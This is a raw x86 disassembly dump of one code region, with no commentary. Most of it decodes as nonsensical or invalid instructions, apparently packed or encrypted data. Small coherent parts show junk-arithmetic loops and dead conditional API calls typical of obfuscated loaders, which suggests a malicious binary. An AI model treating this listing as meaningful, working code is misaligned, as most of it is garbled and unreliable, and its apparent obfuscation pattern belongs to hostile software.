  405a22:	mov    al,ds:0x426c53cb
  405a27:	fdivr  DWORD PTR [eax+0x6c]
  405a2a:	fild   WORD PTR [edi+edi*8]
  405a2d:	add    bl,ch
  405a2f:	and    BYTE PTR [edi+0x689747a4],ch
  405a35:	cs (bad) 
  405a37:	pop    ecx
  405a38:	sub    eax,0x35
  405a3b:	loop   0x4059ed
  405a3d:	neg    al
  405a3f:	cmp    dh,BYTE PTR [esi+0x646d8114]
  405a45:	dec    ebx
  405a46:	imul   ebx,DWORD PTR [ebp+0x5a7e0fd],0x202cf8c1
  405a50:	scas   eax,DWORD PTR es:[edi]
  405a51:	nop
  405a52:	iret   
  405a53:	cld    
  405a54:	test   BYTE PTR [ebx-0x5d],dh
  405a57:	push   ecx
  405a58:	aad    0x57
  405a5a:	or     al,0x3c
  405a5c:	sbb    al,0x54
  405a5e:	xor    DWORD PTR [ecx-0x1e419c39],esp
  405a64:	out    dx,eax
  405a65:	mov    esp,edi
  405a67:	lods   al,BYTE PTR ds:[esi]
  405a68:	sub    al,0x53
  405a6a:	sbb    al,0x15
  405a6c:	push   eax
  405a6d:	in     eax,0xac
  405a6f:	in     eax,0x92
  405a71:	fs sahf 
  405a73:	aam    0x1a
  405a75:	cmp    DWORD PTR [ebx],edx
  405a77:	and    DWORD PTR [ecx-0x30],0x56
  405a7b:	xlat   BYTE PTR ds:[ebx]
  405a7c:	adc    eax,0x45431945
  405a81:	cmp    eax,0x261948d7
  405a86:	jno    0x405a13
  405a88:	and    al,0xbb
  405a8a:	aas    
  405a8b:	iret   
  405a8c:	jmp    0x23d1:0xbc266f6d
  405a93:	fcomp  DWORD PTR [esi]
  405a95:	inc    ecx
  405a96:	xchg   ecx,eax
  405a97:	(bad)  
  405a98:	push   edi
  405a99:	inc    ecx
  405a9a:	add    bl,BYTE PTR [eax-0x65]
  405a9d:	loop   0x405aae
  405a9f:	ja     0x405a8c
  405aa1:	shl    BYTE PTR [esp+eax*4+0x6f],cl
  405aa5:	outs   dx,DWORD PTR ds:[esi]
  405aa6:	in     al,dx
  405aa7:	sbb    BYTE PTR [eax],ch
  405aa9:	xor    BYTE PTR [edi-0x76],ah
  405aac:	xchg   bh,dh
  405aae:	popf   
  405aaf:	inc    edi
  405ab0:	retf   0x7d9a
  405ab3:	dec    ebp
  405ab4:	in     eax,0xa
  405ab6:	mov    ds:0xd7179c62,al
  405abb:	pinsrw mm7,esp,0x60
  405abf:	ins    BYTE PTR es:[edi],dx
  405ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac1:	call   0x2c4cdbd0
  405ac6:	fldenv [ebx-0x5ad26466]
  405acc:	scas   al,BYTE PTR es:[edi]
  405acd:	int    0xd7
  405acf:	push   ebp
  405ad0:	ror    DWORD PTR ds:0x61bd57fc,cl
  405ad6:	jne    0x405b52
  405ad8:	mov    ecx,eax
  405ada:	retf   0xaf10
  405add:	repnz clc 
  405adf:	mov    ecx,0x185ddf2c
  405ae4:	in     al,dx
  405ae5:	sbb    DWORD PTR [ecx+edx*4+0x5fd60c1e],eax
  405aec:	cmp    al,BYTE PTR [esi-0x5ea270b3]
  405af2:	cmp    dh,BYTE PTR [esi]
  405af4:	scas   al,BYTE PTR es:[edi]
  405af5:	shl    BYTE PTR [esi+0x5f],1
  405af8:	bound  ebp,QWORD PTR [esi+ecx*2+0xa3f4068]
  405aff:	jg     0x405b1f
  405b01:	hlt    
  405b02:	jecxz  0x405b1c
  405b04:	mov    edi,0xba37947
  405b09:	into   
  405b0a:	sbb    al,0xae
  405b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b0d:	sub    edx,ebp
  405b0f:	daa    
  405b10:	adc    ebx,DWORD PTR [eax+0x6364130c]
  405b16:	xchg   esi,eax
  405b17:	pop    ss
  405b18:	fbld   TBYTE PTR [edi-0x7f]
  405b1b:	sub    al,0xe7
  405b1d:	dec    esi
  405b1e:	cs aaa 
  405b20:	das    
  405b21:	mov    eax,ds:0x49941a66
  405b26:	mov    edi,0x75efc4c0
  405b2b:	js     0x405ab6
  405b2d:	xor    al,BYTE PTR [edi+edi*8]
  405b30:	shl    BYTE PTR [esi],0xd9
  405b33:	inc    eax
  405b34:	xchg   edx,eax
  405b36:	enter  0xde97,0xdd
  405b3a:	jmp    0x7121:0xd2b5dd49
  405b41:	cs gs ret 0xdd91
  405b46:	hlt    
  405b47:	jae    0x405ad5
  405b49:	inc    edx
  405b4a:	mov    bl,0x8e
  405b4c:	add    eax,0xaefa78d4
  405b51:	mov    ebx,0x77d58d5d
  405b56:	push   ebx
  405b57:	mov    al,ds:0xe48d9c67
  405b5c:	xchg   ch,ah
  405b5e:	inc    edx
  405b5f:	repz sub eax,0x37616369
  405b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b66:	dec    ebp
  405b67:	loope  0x405b9e
  405b69:	inc    BYTE PTR [esi]
  405b6b:	pop    esi
  405b6c:	xchg   ebx,eax
  405b6d:	nop
  405b6e:	inc    edi
  405b6f:	ror    DWORD PTR [ebp-0x50],0x1b
  405b73:	mov    al,ds:0x136dd311
  405b78:	dec    esp
  405b79:	shl    dh,0xbf
  405b7c:	scas   al,BYTE PTR es:[edi]
  405b7d:	repnz or BYTE PTR [ecx-0x52426245],bl
  405b84:	ss loop 0x405c05
  405b87:	ds pushf 
  405b89:	outs   dx,DWORD PTR ds:[esi]
  405b8a:	xor    BYTE PTR [eax+eax*8-0x49c03116],dl
  405b91:	or     BYTE PTR [edx-0x15eda67f],bl
  405b97:	adc    BYTE PTR [ebp+0x29],0xbb
  405b9b:	shl    BYTE PTR [ebp-0x69],1
  405b9e:	cwde   
  405b9f:	loopne 0x405b65
  405ba1:	xchg   DWORD PTR [ecx+0x44cfbe45],edx
  405ba7:	mov    ebp,0x12cc99ef
  405bac:	and    al,0x39
  405bae:	mov    edx,0x75476fdf
  405bb3:	xchg   ecx,eax
  405bb4:	mov    cl,0xbd
  405bb6:	adc    ah,BYTE PTR [eax+0x5c78e755]
  405bbc:	std    
  405bbd:	xor    edi,eax
  405bbf:	jbe    0x405b98
  405bc1:	mov    al,0xfb
  405bc3:	lea    edx,[edx+0x4a995f02]
  405bc9:	rol    DWORD PTR [edx+0x5fcd091a],0x8d
  405bd0:	ret    0x7afc
  405bd3:	leave  
  405bd4:	xor    al,0xf2
  405bd6:	add    esp,esp
  405bd8:	mov    fs:0x2dbc5316,al
  405bde:	rcl    dx,1
  405be1:	push   cs
  405be2:	xor    eax,0xac9bf036
  405be7:	jb     0x405bd7
  405be9:	in     eax,dx
  405bea:	inc    esp
  405beb:	in     al,0x8c
  405bed:	mov    edi,0xbe5c9ad8
  405bf2:	add    BYTE PTR [edx+0x6523ddc2],dl
  405bf8:	or     DWORD PTR [eax-0x32],0x9109f4b1
  405bff:	sbb    eax,0xac5ba069
  405c04:	leave  
  405c05:	sub    cl,BYTE PTR [eax+0x74]
  405c08:	ins    BYTE PTR es:[edi],dx
  405c09:	push   eax
  405c0a:	pop    es
  405c0b:	(bad)  
  405c0c:	ds xchg ebp,eax
  405c0e:	sbb    al,0x13
  405c10:	dec    eax
  405c11:	call   0xea93:0x7eeb40e0
  405c18:	in     al,0x78
  405c1a:	jo     0x405bfa
  405c1c:	adc    esi,DWORD PTR [ebp+0x39267c0a]
  405c22:	and    al,0xfc
  405c24:	mov    es,WORD PTR [edx]
  405c26:	mov    cl,0x22
  405c28:	jmp    0xb433:0x580c2f9
  405c2f:	test   dl,bh
  405c31:	mov    edx,0xfd658296
  405c36:	iret   
  405c37:	sub    edi,DWORD PTR [eax-0x75]
  405c3a:	test   al,0xad
  405c3c:	pop    ebx
  405c3d:	popf   
  405c3e:	es out 0xa0,al
  405c41:	aas    
  405c42:	shr    BYTE PTR [ebx],cl
  405c44:	fst    DWORD PTR [eax+0x49]
  405c47:	stos   BYTE PTR es:[edi],al
  405c48:	out    dx,al
  405c49:	rol    DWORD PTR [eax+eiz*2+0x3f],1
  405c4d:	and    al,0xe5
  405c4f:	push   ecx
  405c50:	out    dx,eax
  405c51:	inc    esi
  405c52:	inc    eax
  405c53:	dec    esp
  405c54:	mov    ds:0x2b2a5bd6,eax
  405c59:	xor    eax,0xad7f1b86
  405c5e:	add    eax,0x7e9a128e
  405c63:	cwde   
  405c64:	test   eax,0x5201ccfa
  405c69:	mov    cl,0xa4
  405c6b:	and    eax,0x780f442
  405c70:	inc    ecx
  405c71:	mov    esi,DWORD PTR [esi+0x4de06e47]
  405c77:	repz gs push ebp
  405c7a:	fiadd  DWORD PTR [esi+0x5c1f82f9]
  405c80:	push   ebx
  405c81:	sbb    DWORD PTR [edi-0x5d],esp
  405c84:	xchg   ebx,eax
  405c85:	ja     0x405c46
  405c87:	mov    al,ds:0x1801ea1f
  405c8c:	not    DWORD PTR [eax]
  405c8e:	inc    ebx
  405c8f:	mov    esi,0xb9014b4f
  405c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c95:	mov    cl,0x64
  405c97:	iret   
  405c98:	test   eax,0x43bc0d8a
  405c9d:	rcl    BYTE PTR [edx],1
  405c9f:	retf   
  405ca0:	daa    
  405ca1:	xlat   BYTE PTR ds:[ebx]
  405ca2:	repnz test al,0x10
  405ca5:	fwait
  405ca6:	sub    eax,0x93fe34bd
  405cab:	fmul   DWORD PTR [eax-0x408abc42]
  405cb1:	mov    edi,0x2a77b14b
  405cb6:	add    ah,BYTE PTR [ecx-0x1593e167]
  405cbc:	lahf   
  405cbd:	sahf   
  405cbe:	loope  0x405cfe
  405cc0:	pop    edi
  405cc1:	das    
  405cc2:	dec    edi
  405cc3:	cwde   
  405cc4:	push   esi
  405cc5:	and    BYTE PTR [edi+0x76],0x5d
  405cc9:	cmp    ecx,eax
  405ccb:	jne    0x4060e3
  405cd1:	add    DWORD PTR ds:0x4345bf,edx
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x4345d3,0x4345fb
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43468f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x434647,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x4345c7,0x12
  405d19:	cmp    DWORD PTR ds:0x4345c7,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x4345c7,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x4345c7
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x4345c7,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x50681bd6
  405d8d:	jno    0x405d57
  405d8f:	mov    ch,0x3c
  405d91:	jle    0x405e11
  405d93:	les    edi,FWORD PTR [ecx+0x7e]
  405d96:	jle    0x405df7
  405d98:	retf   0xbf1c
  405d9b:	and    esi,DWORD PTR [edi+edi*4]
  405d9e:	sub    eax,ebp
  405da0:	mov    ebp,0x348f0f60
  405da5:	push   es
  405da6:	mov    ds:0x77fb226,al
  405dab:	jo     0x405d66
  405dad:	mov    eax,0xee6cf523
  405db2:	popa   
  405db3:	pop    sp
  405db5:	ret    0x610c
  405db8:	adc    cl,BYTE PTR [eax-0x4c9b764f]
  405dbe:	pop    es
  405dbf:	clc    
  405dc0:	inc    edi
  405dc1:	mov    ch,ch
  405dc3:	lahf   
  405dc4:	ins    DWORD PTR es:[edi],dx
  405dc5:	sub    dl,cl
  405dc7:	cwde   
  405dc8:	pop    ss
  405dc9:	mov    edx,0xd9b9569
  405dce:	ins    DWORD PTR es:[edi],dx
  405dcf:	out    dx,al
  405dd0:	cdq    
  405dd1:	xchg   ebx,eax
  405dd2:	pop    di
  405dd4:	in     eax,0xdf
  405dd6:	daa    
  405dd7:	sbb    al,0x87
  405dd9:	lods   eax,DWORD PTR ds:[esi]
  405dda:	pop    edx
  405ddb:	push   ss
  405ddc:	mov    ebx,0xf96bca9d
  405de1:	clc    
  405de2:	inc    esi
  405de3:	sbb    ah,ch
  405de5:	pop    esp
  405de6:	lods   eax,DWORD PTR ds:[esi]
  405de7:	rcr    DWORD PTR [ebp+0x3b02a107],cl
  405ded:	ficom  DWORD PTR ds:0x7b16ad04
  405df3:	sbb    bl,cl
  405df5:	loope  0x405dba
  405df7:	ss js  0x405e47
  405dfa:	aas    
  405dfb:	retf   
  405dfc:	xchg   ebx,eax
  405dfd:	push   ecx
  405dfe:	and    ebp,DWORD PTR [eax+0x7d]
  405e01:	xor    edi,DWORD PTR ds:0x6da158e3
  405e07:	stos   BYTE PTR es:[edi],al
  405e08:	add    BYTE PTR [esi+0x42],bh
  405e0b:	dec    edi
  405e0c:	outs   dx,DWORD PTR ds:[esi]
  405e0d:	and    ah,BYTE PTR [esp+eax*4-0x1e]
  405e11:	jmp    0xf4909dfa
  405e16:	test   eax,0x3bc30f44
  405e1b:	xlat   BYTE PTR ds:[ebx]
  405e1c:	(bad)  
  405e1d:	bound  ebx,QWORD PTR [eax+0x5fa8faf]
  405e23:	in     al,dx
  405e24:	loop   0x405e24
  405e26:	out    dx,eax
  405e27:	sbb    ch,dh
  405e29:	add    dh,bh
  405e2b:	jbe    0x405deb
  405e2d:	or     al,dh
  405e2f:	and    BYTE PTR [edi],ah
  405e31:	jl     0x405e33
  405e33:	inc    esi
  405e34:	scas   eax,DWORD PTR es:[edi]
  405e35:	jbe    0x405e53
  405e37:	xchg   ecx,edx
  405e39:	cld    
  405e3a:	jle    0x405e0c
  405e3c:	(bad)  
  405e3d:	enter  0x5a4b,0xd2
  405e41:	push   0x5c
  405e43:	jae    0x405e14
  405e45:	mov    cl,0xd3
  405e47:	and    al,0x3f
  405e49:	(bad)  
  405e4a:	cli    
  405e4b:	leave  
  405e4c:	or     al,0xfb
  405e4e:	pop    ebp
  405e4f:	aam    0x92
  405e51:	jae    0x405ec8
  405e53:	xlat   BYTE PTR ds:[ebx]
  405e54:	in     al,dx
  405e55:	jb     0x405e7d
  405e57:	call   0x8f7b8a09
  405e5c:	xlat   BYTE PTR ds:[ebx]
  405e5d:	inc    edx
  405e5e:	fnsave [edx]
  405e60:	dec    esi
  405e61:	dec    ecx
  405e62:	mov    dh,BYTE PTR [ebp+0x3b]
  405e65:	cli    
  405e66:	cmp    ch,BYTE PTR [ebp-0x4fc8949b]
  405e6c:	cld    
  405e6d:	add    DWORD PTR [ecx],0x568321c2
  405e73:	outs   dx,BYTE PTR ds:[esi]
  405e74:	and    ch,BYTE PTR [esi+0xe]
  405e77:	jno    0x405e21
  405e79:	add    eax,edi
  405e7b:	(bad)  
  405e7c:	mov    al,ds:0x2dd2b9e4
  405e81:	or     al,0xf4
  405e83:	int    0x4a
  405e85:	test   al,0x90
  405e87:	or     BYTE PTR [ebp-0x1f],cl
  405e8a:	push   cs
  405e8b:	adc    esp,DWORD PTR [esi+0x2e]
  405e8e:	fbld   TBYTE PTR ds:0x1c9eea7d
  405e94:	mov    DWORD PTR [ebp+esi*4-0x77],esp
  405e98:	imul   ecx,DWORD PTR [esp+ecx*8-0x3a],0xffffff93
  405e9d:	mov    ?,WORD PTR [edi+0x6f]
  405ea0:	mov    BYTE PTR [ecx-0x68de9322],ch
  405ea6:	sbb    bh,BYTE PTR [ecx+0x143787b7]
  405eac:	fldcw  WORD PTR [eax]
  405eae:	ins    BYTE PTR es:[edi],dx
  405eaf:	xlat   BYTE PTR ds:[ebx]
  405eb0:	les    ecx,FWORD PTR [esi-0x45]
  405eb3:	dec    esi
  405eb4:	(bad)  
  405eb5:	adc    cl,BYTE PTR [eax-0x3d]
  405eb8:	sbb    edi,edx
  405eba:	xchg   BYTE PTR ds:0xaa7a6141,bh
  405ec0:	mov    edx,0x35ae56b4
  405ec5:	pop    edx
  405ec6:	add    eax,0xdf0129bf
  405ecb:	xor    eax,0x6466f332
  405ed0:	jns    0x405ead
  405ed2:	shl    DWORD PTR [ebp-0x4c722225],cl
  405ed8:	xchg   ecx,eax
  405ed9:	xor    eax,0x62c94dfe
  405ede:	(bad)  
  405edf:	cld    
  405ee0:	ret    0xa2a5
  405ee3:	mov    eax,0x39b8ac4b
  405ee8:	mov    BYTE PTR [ebx+0xf],al
  405eeb:	jno    0x405f17
  405eed:	mov    ebx,0x8b546f5d
  405ef2:	and    DWORD PTR [ecx],ecx
  405ef4:	call   0x39b0:0x21e3b3bf
  405efb:	lds    esp,FWORD PTR [ebp+0x5c]
  405efe:	std    
  405eff:	popa   
  405f00:	(bad)  
  405f01:	xor    eax,0xa87381b9
  405f06:	and    dh,ch
  405f08:	jbe    0x405ef8
  405f0a:	(bad)
  405f0d:	xor    bl,cl
  405f0f:	outs   dx,DWORD PTR ds:[esi]
  405f10:	pop    ecx
  405f11:	scas   al,BYTE PTR es:[edi]
  405f12:	push   cs
  405f13:	scas   eax,DWORD PTR es:[edi]
  405f14:	fdiv   DWORD PTR ds:0x2ba1
  405f1a:	xchg   BYTE PTR [esi+0x3a],ah
  405f1d:	loop   0x405f86
  405f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f20:	fcomi  st,st(2)
  405f22:	xchg   edi,eax
  405f23:	inc    ebx
  405f24:	sbb    al,0x2f
  405f26:	xor    BYTE PTR [esi-0x4777d7dd],cl
  405f2c:	test   eax,0x40306ed5
  405f31:	xor    BYTE PTR [ecx+0x49a288d],dh
  405f37:	push   edi
  405f38:	and    al,0x83
  405f3a:	daa    
  405f3b:	in     al,0x6b
  405f3d:	sti    
  405f3e:	dec    ecx
  405f3f:	mov    ds:0x5d14567e,eax
  405f44:	jne    0x405eda
  405f46:	and    esi,esi
  405f48:	push   0x2c
  405f4a:	and    dh,BYTE PTR [esi]
  405f4c:	sbb    eax,0x6acc159e
  405f51:	fs sbb eax,0x459f5e09
  405f57:	sbb    cl,cl
  405f59:	jp     0x405f09
  405f5b:	or     eax,0x96ac17cf
  405f60:	mov    gs,WORD PTR [ebx+0x42117da8]
  405f66:	movd   DWORD PTR [edx-0x357da3e2],mm1
  405f6d:	lahf   
  405f6e:	dec    ebp
  405f6f:	add    ebp,DWORD PTR [ebp+0x19]
  405f72:	xchg   ebx,eax
  405f73:	xor    BYTE PTR [esi+0x5e],ch
  405f76:	xchg   ecx,eax
  405f77:	mov    bl,0xe9
  405f79:	outs   dx,BYTE PTR ds:[esi]
  405f7a:	mov    ds,WORD PTR [ebp+0x1a]
  405f7d:	jo     0x405f62
  405f7f:	mov    WORD PTR [eax+0x72],ds
  405f82:	dec    esp
  405f83:	iret   
  405f84:	lea    ebp,[ebp-0x7b1a7397]
  405f8a:	inc    edx
  405f8b:	jp     0x405f9f
  405f8d:	pop    ebx
  405f8e:	shl    esp,cl
  405f90:	cmp    DWORD PTR [eax+0x50],edi
  405f93:	xchg   ecx,eax
  405f94:	inc    ebx
  405f95:	retf   
  405f96:	cmp    al,0x7b
  405f98:	xor    ah,BYTE PTR [ecx]
  405f9a:	adc    BYTE PTR [ebx-0xc1ec3f0],dl
  405fa0:	push   ebp
  405fa1:	xchg   DWORD PTR ds:0x60714619,ecx
  405fa7:	sbb    al,0x3c
  405fa9:	push   edi
  405faa:	shl    BYTE PTR [esi-0x35],0x36
  405fae:	adc    eax,0x5c72156f
  405fb3:	outs   dx,BYTE PTR ds:[esi]
  405fb4:	ret    0x24a7
  405fb7:	mov    ebx,DWORD PTR [esi-0x5b3b1802]
  405fbd:	and    al,0xaf
  405fbf:	in     al,dx
  405fc0:	sbb    al,0xb6
  405fc2:	test   al,0x42
  405fc4:	dec    ecx
  405fc5:	sub    al,BYTE PTR [edx]
  405fc7:	(bad)  
  405fc8:	pusha  
  405fc9:	cmp    BYTE PTR [ebp-0x61],dh
  405fcc:	fisttp WORD PTR [esi-0x54]
  405fcf:	or     eax,edx
  405fd1:	or     eax,0x8cb1bc19
  405fd6:	enter  0x33d3,0xae
  405fda:	jmp    0x406042
  405fdc:	jb     0x406039
  405fde:	enter  0xe872,0x90
  405fe2:	jl     0x405f71
  405fe4:	mov    ah,0xd2
  405fe6:	lea    ebx,ds:0x5d5ab047
  405fec:	hlt    
  405fed:	cmp    BYTE PTR ds:0x2894e14c,dh
  405ff3:	sbb    DWORD PTR [esi],esi
  405ff5:	in     al,dx
  405ff6:	pop    ebp
  405ff7:	mov    dl,0x88
  405ff9:	pop    ds
  405ffa:	sub    eax,0x2aa1f88d
  405fff:	aas    
  406000:	xchg   ebp,eax
  406001:	jnp    0x406019
  406003:	int    0x3b
  406005:	enter  0x2c8c,0xd5
  406009:	in     eax,dx
  40600a:	test   BYTE PTR [esi-0x2d],al
  40600d:	imul   edx,DWORD PTR [eiz*8+0x420cd55e],0xe9ea2fb9
  406018:	scas   al,BYTE PTR es:[edi]
  406019:	bnd js 0x405fe5
  40601c:	daa    
  40601d:	inc    ebp
  40601e:	pop    edx
  40601f:	sti    
  406020:	in     eax,dx
  406021:	aas    
  406022:	inc    esi
  406023:	aaa    
  406024:	clc    
  406025:	ror    ebp,cl
  406027:	into   
  406028:	mov    esi,0x8c6e4136
  40602d:	mov    dl,0x8
  40602f:	cmp    ecx,0xffffffa8
  406032:	and    ch,al
  406034:	push   ds
  406035:	mov    ah,BYTE PTR [ebp-0x16adc0b6]
  40603b:	and    eax,0x216c295e
  406040:	sub    DWORD PTR [edi],ebp
  406042:	xor    edx,edx
  406044:	in     al,dx
  406045:	jmp    0x4060ab
  406047:	inc    ebx
  406048:	push   edi
  406049:	push   cs
  40604a:	sub    BYTE PTR [eax-0x3],ah
  40604d:	sub    DWORD PTR [edi+esi*1-0x5836f144],ebp
  406054:	in     al,0xe0
  406056:	jne    0x405ffa
  406058:	mov    ds:0x9a77cd73,al
  40605d:	test   al,0x57
  40605f:	out    dx,eax
  406060:	in     al,0x3d
  406062:	repnz xor DWORD PTR [edx-0x71],ecx
  406066:	shl    BYTE PTR ds:[ebx-0x4d],cl
  40606a:	out    0xba,eax
  40606c:	icebp  
  40606d:	ds pop eax
  40606f:	pop    esp
  406070:	loopne 0x40607c
  406072:	jl     0x406001
  406074:	adc    eax,0x85f47c94
  406079:	push   edx
  40607a:	push   ebx
  40607b:	mov    BYTE PTR [eax+eax*4+0x67b5ccf0],bl
  406082:	xchg   edx,eax
  406083:	and    DWORD PTR [edx-0x30],0x40
  406087:	mov    edx,0x695806da
  40608c:	mov    dl,0xc3
  40608e:	rcl    dl,1
  406090:	retf   
  406091:	xchg   bh,cl
  406093:	jbe    0x4060f1
  406095:	push   esp
  406096:	enter  0x5a65,0xde
  40609a:	pop    edi
  40609b:	pusha  
  40609c:	in     al,dx
  40609d:	(bad)  [esi+0x6d]
  4060a0:	int3   
  4060a1:	nop
  4060a2:	ja     0x4060b6
  4060a4:	cdq    
  4060a5:	mov    ecx,DWORD PTR [eax]
  4060a7:	rcr    DWORD PTR [ebp+0x50f156b4],1
  4060ad:	lock mov esp,DWORD PTR [ecx-0x39f1681f]
  4060b4:	idiv   BYTE PTR [edi-0x5e62e6e7]
  4060ba:	push   ecx
  4060bb:	sbb    dx,WORD PTR ds:[edi]
  4060bf:	in     al,dx
  4060c0:	adc    BYTE PTR [edx+ebp*8+0x6760c080],al
  4060c7:	mov    cl,0xeb
  4060c9:	mov    edi,0xac767fc3
  4060ce:	ins    BYTE PTR es:[edi],dx
  4060cf:	mov    edi,0x2bba2186
  4060d4:	repz (bad) 
  4060d6:	pop    edi
  4060d7:	fcom   QWORD PTR [eax+edx*2+0x6c]
  4060db:	loop   0x406090
  4060dd:	je     0x405d65
  4060e3:	leave  
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x4345ef
  406101:	mov    eax,ds:0x43469b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x4345d3,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x4345d3
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x4345d3,ecx
  40612c:	cmp    DWORD PTR ds:0x4345d3,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x4345d3,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x4345b7,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x4345fb,0x0
  406168:	mov    ecx,DWORD PTR ds:0x4345fb
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x4345fb,ecx
  406175:	cmp    DWORD PTR ds:0x4345fb,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x4345fb,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x4345fb
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x4345fb,ecx
  4061a7:	cmp    DWORD PTR ds:0x4345fb,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	scas   eax,DWORD PTR es:[edi]
  4061c6:	(bad)  
  4061c7:	lods   eax,DWORD PTR ds:[esi]
  4061c8:	mov    BYTE PTR [ebx+0x3f],dh
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x406228
  4061d2:	ins    BYTE PTR es:[edi],dx
  4061d3:	test   DWORD PTR [edi+0x40cecfde],ebx
  4061d9:	out    0x47,eax
  4061db:	dec    esp
  4061dc:	push   cs
  4061dd:	imul   BYTE PTR [edx+0x47e360eb]
  4061e3:	sub    cl,BYTE PTR [edx+edx*1+0x2e8f60fa]
  4061ea:	in     eax,dx
  4061eb:	xor    al,0xf1
  4061ed:	and    BYTE PTR [edi-0x43],dl
  4061f0:	add    al,0xa9
  4061f2:	test   DWORD PTR [esi],esi
  4061f4:	(bad)  
  4061f5:	xor    bh,bh
  4061f7:	cmp    DWORD PTR [edi+ecx*2+0x3b6c5ba2],ebx
  4061fe:	mov    ah,0x6a
  406200:	das    
  406201:	mov    al,0xad
  406203:	ficom  DWORD PTR [ecx]
  406205:	xor    dl,BYTE PTR [esi]
  406207:	daa    
  406208:	or     DWORD PTR [eax],edi
  40620a:	mov    ds:0xcb2e54f9,al
  40620f:	dec    ebx
  406210:	xchg   esp,eax
  406211:	mov    cl,0x77
  406213:	stos   DWORD PTR es:[edi],eax
  406214:	sbb    eax,0x9a5874d0
  406219:	in     eax,dx
  40621a:	(bad)  
  40621b:	mov    dl,0x21
  40621d:	jecxz  0x4061fd
  40621f:	out    dx,eax
  406220:	dec    eax
  406221:	shl    DWORD PTR [ebx-0x4bcd349d],0x48
  406228:	leave  
  406229:	mov    DWORD PTR [edi-0x4d],edi
  40622c:	fs jmp 0x4061c1
  40622f:	inc    esi
  406230:	ds add al,0xfd
  406233:	(bad)  
  406234:	or     esi,edx
  406236:	pop    edi
  406237:	in     eax,0xe
  406239:	sub    eax,esi
  40623b:	cmp    al,BYTE PTR [eax]
  40623d:	retf   
  40623e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40623f:	ret    0x3ea1
  406242:	test   BYTE PTR [edi-0xa3b1fa7],0x27
  406249:	(bad)  
  40624a:	sbb    ebx,DWORD PTR [esi]
  40624c:	mov    al,0xd3
  40624e:	pop    ebp
  40624f:	sub    eax,0x8109fffc
  406254:	fcom   DWORD PTR ds:0x35781f47
  40625a:	adc    al,0xca
  40625c:	jbe    0x406295
  40625e:	in     al,0xaf
  406260:	jns    0x40628f
  406262:	xor    eax,0x5dd250ea
  406267:	jg     0x4062e6
  406269:	mov    edx,0x202c32fa
  40626e:	js     0x406257
  406270:	mov    eax,0xf3b0cc35
  406275:	out    0x89,al
  406277:	or     eax,0x4d94c005
  40627c:	shl    BYTE PTR [eax-0x42c91759],cl
  406282:	adc    esi,DWORD PTR [eiz*1+0x6a9946e8]
  406289:	sbb    dh,BYTE PTR [edi+ebx*8+0x3f3df272]
  406290:	mov    ebp,0x9015b5d
  406295:	add    DWORD PTR [ecx-0x4a387e54],esp
  40629b:	add    DWORD PTR [edi+0x14],esi
